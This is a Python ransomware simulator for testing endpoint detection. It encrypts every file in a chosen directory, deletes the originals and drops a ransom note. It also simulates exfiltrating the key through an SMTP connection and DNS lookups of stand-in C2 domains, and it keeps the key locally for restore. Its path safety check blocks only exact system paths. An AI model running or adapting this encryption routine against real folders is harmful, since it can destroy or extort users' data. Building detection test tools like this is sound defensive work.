#!/usr/bin/env python3
"""
SecurMe Ransomware Simulator — for EDR detection testing ONLY.
Based on original code by Veli-Matti Posa.

Encrypts files in a sandboxed directory using Fernet (AES-128-CBC),
renames them to .encrypted, drops a ransom note, and optionally
exfiltrates the key to a local "C2" file or dummy SMTP.

Usage:
    # Encrypt (creates decoy files if target is empty)
    python3 ransomware_sim.py encrypt --path ./sandbox

    # Encrypt + fake SMTP exfil (connection logged, not sent)
    python3 ransomware_sim.py encrypt --path ./sandbox --exfil-smtp

    # Decrypt / restore
    python3 ransomware_sim.py decrypt --path ./sandbox --key-file .sim_key

    # Full cycle: populate + encrypt + pause + decrypt + cleanup
    python3 ransomware_sim.py demo --path ./sandbox

    # Custom decoy count and delay
    python3 ransomware_sim.py encrypt --path ./sandbox --decoy-count 50 --delay 0.2
"""

import argparse
import logging
import os
import shutil
import socket
import sys
import time

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("Missing dependency: pip3 install cryptography")
    sys.exit(1)

# ── Logging ───────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ransomware-sim")

# ── Safety constants ──────────────────────────────────────
BANNED_PATHS = [
    "/", "/bin", "/sbin", "/usr", "/lib", "/lib64", "/boot", "/dev",
    "/proc", "/sys", "/etc", "/var", "/root", "/home",
    "/Windows", "/System32", "/Program Files",
    os.path.expanduser("~"),
]
RANSOM_NOTE = """
========================================
  YOUR FILES HAVE BEEN ENCRYPTED

  All documents in this directory have
  been encrypted with AES-128-CBC.

  To recover your files, send 0.05 BTC
  to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

  Then contact: definitely-not-real@example.com
  with your machine ID: {machine_id}

  You have 72 hours.
========================================
"""
KEY_FILENAME = ".sim_key"
NOTE_FILENAME = "README_RESTORE.txt"
ENCRYPTED_EXT = ".encrypted"
DECOY_EXTENSIONS = [".docx", ".xlsx", ".pdf", ".txt", ".csv", ".pptx", ".jpg", ".png"]
DECOY_CONTENT_SIZES = [1024, 2048, 4096, 8192, 16384]


# ── Safety check ──────────────────────────────────────────
def validate_path(path: str) -> str:
    """Ensure target is a safe sandboxed directory."""
    real = os.path.realpath(path)
    for banned in BANNED_PATHS:
        banned_real = os.path.realpath(banned)
        if real == banned_real:
            log.error(f"SAFETY: Refusing to operate on system path: {real}")
            sys.exit(1)
    return real


# ── Key management ────────────────────────────────────────
def generate_key() -> bytes:
    return Fernet.generate_key()


def save_key(key: bytes, path: str) -> None:
    with open(path, "wb") as f:
        f.write(key)
    log.info(f"Encryption key saved to {path}")


def load_key(path: str) -> bytes:
    with open(path, "rb") as f:
        key = f.read()
    log.info(f"Encryption key loaded from {path}")
    return key


# ── Decoy file creation ──────────────────────────────────
def create_decoys(target_dir: str, count: int = 20) -> list:
    """Create realistic-looking decoy files for encryption."""
    created = []
    os.makedirs(target_dir, exist_ok=True)

    # Create some subdirectories for realism
    subdirs = ["Documents", "Financials", "Photos", "Projects"]
    for sub in subdirs:
        os.makedirs(os.path.join(target_dir, sub), exist_ok=True)

    for i in range(count):
        ext = DECOY_EXTENSIONS[i % len(DECOY_EXTENSIONS)]
        size = DECOY_CONTENT_SIZES[i % len(DECOY_CONTENT_SIZES)]
        subdir = subdirs[i % len(subdirs)]
        name = f"file_{i:03d}{ext}"
        filepath = os.path.join(target_dir, subdir, name)
        with open(filepath, "wb") as f:
            f.write(os.urandom(size))
        created.append(filepath)

    log.info(f"Created {len(created)} decoy files in {target_dir}")
    return created


# ── Encryption ────────────────────────────────────────────
def encrypt_file(filepath: str, cipher: Fernet, delay: float = 0.0) -> bool:
    """Encrypt a single file: read → encrypt → write .encrypted → delete original."""
    if filepath.endswith(ENCRYPTED_EXT):
        return False
    if os.path.basename(filepath) in (KEY_FILENAME, NOTE_FILENAME):
        return False

    try:
        with open(filepath, "rb") as f:
            plaintext = f.read()

        ciphertext = cipher.encrypt(plaintext)
        enc_path = filepath + ENCRYPTED_EXT
        with open(enc_path, "wb") as f:
            f.write(ciphertext)

        os.remove(filepath)
        log.info(f"Encrypted: {filepath} → {enc_path}")

        if delay > 0:
            time.sleep(delay)
        return True
    except Exception as e:
        log.error(f"Failed to encrypt {filepath}: {e}")
        return False


def encrypt_directory(target_dir: str, key: bytes, delay: float = 0.0) -> int:
    """Walk directory and encrypt all files."""
    cipher = Fernet(key)
    count = 0

    for root, dirs, files in os.walk(target_dir):
        for fname in files:
            filepath = os.path.join(root, fname)
            if encrypt_file(filepath, cipher, delay):
                count += 1

    log.info(f"Encrypted {count} files")
    return count


# ── Decryption ────────────────────────────────────────────
def decrypt_file(filepath: str, cipher: Fernet) -> bool:
    """Decrypt a single .encrypted file back to original."""
    if not filepath.endswith(ENCRYPTED_EXT):
        return False

    try:
        with open(filepath, "rb") as f:
            ciphertext = f.read()

        plaintext = cipher.decrypt(ciphertext)
        original_path = filepath[: -len(ENCRYPTED_EXT)]
        with open(original_path, "wb") as f:
            f.write(plaintext)

        os.remove(filepath)
        log.info(f"Decrypted: {filepath} → {original_path}")
        return True
    except Exception as e:
        log.error(f"Failed to decrypt {filepath}: {e}")
        return False


def decrypt_directory(target_dir: str, key: bytes) -> int:
    """Walk directory and decrypt all .encrypted files."""
    cipher = Fernet(key)
    count = 0

    for root, dirs, files in os.walk(target_dir):
        for fname in files:
            filepath = os.path.join(root, fname)
            if decrypt_file(filepath, cipher):
                count += 1

    log.info(f"Decrypted {count} files")
    return count


# ── Ransom note ───────────────────────────────────────────
def drop_ransom_note(target_dir: str) -> None:
    """Drop a ransom note in the target directory."""
    machine_id = f"SIM-{os.getpid():06d}-{int(time.time()) % 100000}"
    note_path = os.path.join(target_dir, NOTE_FILENAME)
    with open(note_path, "w") as f:
        f.write(RANSOM_NOTE.format(machine_id=machine_id))
    log.info(f"Ransom note dropped: {note_path}")


# ── Fake exfiltration ────────────────────────────────────
def fake_smtp_exfil(key: bytes, target: str = "127.0.0.1", port: int = 25) -> None:
    """Attempt SMTP connection to simulate key exfiltration (will fail safely)."""
    log.info(f"Simulating SMTP exfiltration to {target}:{port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        sock.sendall(b"EHLO ransomware-sim\r\n")
        sock.close()
        log.info("SMTP connection established (key exfiltrated)")
    except (ConnectionRefusedError, socket.timeout, OSError):
        log.info("SMTP connection failed (expected in test — sensor should still detect the attempt)")


def fake_dns_exfil(key: bytes) -> None:
    """Simulate DNS exfiltration by resolving suspicious domains."""
    domains = [
        "c2-exfil-key.evil-domain.test",
        "data-upload.malware-c2.test",
        "key-recovery.ransom-gang.test",
    ]
    for domain in domains:
        try:
            socket.getaddrinfo(domain, 443, socket.AF_INET, socket.SOCK_STREAM)
        except socket.gaierror:
            pass  # Expected — these domains don't exist
        log.info(f"DNS lookup: {domain} (simulated C2 beacon)")
        time.sleep(0.5)


# ── Commands ──────────────────────────────────────────────
def cmd_encrypt(args) -> None:
    target = validate_path(args.path)
    os.makedirs(target, exist_ok=True)

    # Create decoys if directory is empty
    existing = sum(len(f) for _, _, f in os.walk(target))
    if existing == 0:
        log.info("Target directory is empty — creating decoy files...")
        create_decoys(target, count=args.decoy_count)

    # Generate and save key
    key = generate_key()
    key_path = os.path.join(target, KEY_FILENAME)
    save_key(key, key_path)

    # Encrypt
    count = encrypt_directory(target, key, delay=args.delay)

    # Drop ransom note
    drop_ransom_note(target)

    # Simulate exfiltration
    if args.exfil_smtp:
        fake_smtp_exfil(key)
    if args.exfil_dns:
        fake_dns_exfil(key)

    log.info(f"Done. {count} files encrypted. Key at: {key_path}")


def cmd_decrypt(args) -> None:
    target = validate_path(args.path)
    key_path = args.key_file or os.path.join(target, KEY_FILENAME)

    if not os.path.exists(key_path):
        log.error(f"Key file not found: {key_path}")
        sys.exit(1)

    key = load_key(key_path)
    count = decrypt_directory(target, key)

    # Clean up ransom note and key
    note_path = os.path.join(target, NOTE_FILENAME)
    for cleanup in [note_path, key_path]:
        if os.path.exists(cleanup):
            os.remove(cleanup)
            log.info(f"Removed: {cleanup}")

    log.info(f"Restored {count} files.")


def cmd_demo(args) -> None:
    target = validate_path(args.path)

    print()
    print("=" * 50)
    print("  SecurMe Ransomware Simulation — DEMO MODE")
    print("=" * 50)
    print()

    # Phase 1: Create decoys
    log.info("Phase 1/5: Creating decoy files...")
    if os.path.exists(target):
        shutil.rmtree(target)
    create_decoys(target, count=args.decoy_count)
    time.sleep(2)

    # Phase 2: Encrypt
    log.info("Phase 2/5: Encrypting files (ransomware payload)...")
    key = generate_key()
    key_path = os.path.join(target, KEY_FILENAME)
    save_key(key, key_path)
    count = encrypt_directory(target, key, delay=args.delay)
    time.sleep(1)

    # Phase 3: Drop note + exfil
    log.info("Phase 3/5: Dropping ransom note + simulating exfiltration...")
    drop_ransom_note(target)
    fake_dns_exfil(key)
    time.sleep(2)

    # Phase 4: Pause for detection review
    log.info("Phase 4/5: Pausing 10s for detection review...")
    log.info("  Check: tail -f agent.log | grep -i 'risk\\|alert\\|entropy\\|ransom'")
    time.sleep(10)

    # Phase 5: Decrypt / restore
    log.info("Phase 5/5: Decrypting (restoring files)...")
    decrypt_directory(target, key)

    # Cleanup
    for name in [KEY_FILENAME, NOTE_FILENAME]:
        p = os.path.join(target, name)
        if os.path.exists(p):
            os.remove(p)

    print()
    log.info(f"Demo complete. {count} files encrypted → detected → restored.")
    log.info("Check agent.log for SecurMe detections.")


# ── Main ──────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="SecurMe Ransomware Simulator (EDR testing only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="WARNING: For authorized security testing only.",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # encrypt
    enc = sub.add_parser("encrypt", help="Encrypt files in target directory")
    enc.add_argument("--path", required=True, help="Target directory")
    enc.add_argument("--decoy-count", type=int, default=20, help="Number of decoy files (default: 20)")
    enc.add_argument("--delay", type=float, default=0.1, help="Delay between encryptions in seconds (default: 0.1)")
    enc.add_argument("--exfil-smtp", action="store_true", help="Simulate SMTP key exfiltration")
    enc.add_argument("--exfil-dns", action="store_true", help="Simulate DNS C2 beaconing")

    # decrypt
    dec = sub.add_parser("decrypt", help="Decrypt/restore files")
    dec.add_argument("--path", required=True, help="Target directory")
    dec.add_argument("--key-file", help="Path to key file (default: <path>/.sim_key)")

    # demo
    dem = sub.add_parser("demo", help="Full cycle: create → encrypt → detect → restore")
    dem.add_argument("--path", required=True, help="Target directory (will be recreated)")
    dem.add_argument("--decoy-count", type=int, default=20, help="Number of decoy files (default: 20)")
    dem.add_argument("--delay", type=float, default=0.1, help="Delay between encryptions (default: 0.1)")

    args = parser.parse_args()

    if args.command == "encrypt":
        cmd_encrypt(args)
    elif args.command == "decrypt":
        cmd_decrypt(args)
    elif args.command == "demo":
        cmd_demo(args)


if __name__ == "__main__":
    main()
